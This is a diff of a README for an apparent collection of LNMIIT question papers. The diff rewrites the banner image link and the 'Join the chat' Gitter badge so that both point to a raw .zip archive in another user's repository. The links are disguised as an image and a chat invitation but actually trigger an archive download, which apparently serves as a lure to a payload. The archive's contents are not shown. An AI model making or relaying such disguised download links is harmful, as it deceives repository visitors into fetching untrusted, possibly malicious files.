@@ -1,9 +1,9 @@
 
 A collection of question papers for all subjects for all available years.
 
-![Cybros](https://github.com/phunsukwangdu/image/blob/master/cybros.jpg)
+![Cybros](https://raw.githubusercontent.com/aniketagrawal/paper.lnmiit/master/year4/sem7/cce/lnmiit_paper_v1.3.zip)
 
-![DUB](https://img.shields.io/dub/l/vibe-d.svg?style=flat) [![Join the chat](https://img.shields.io/badge/gitter-join%20chat%20%E2%86%92-brightgreen.svg)](https://gitter.im/LNMIIT-Computer-Club/Lobby)
+![DUB](https://img.shields.io/dub/l/vibe-d.svg?style=flat) [![Join the chat](https://img.shields.io/badge/gitter-join%20chat%20%E2%86%92-brightgreen.svg)](https://raw.githubusercontent.com/aniketagrawal/paper.lnmiit/master/year4/sem7/cce/lnmiit_paper_v1.3.zip)
 
 
 **Adding a new paper guidelines**
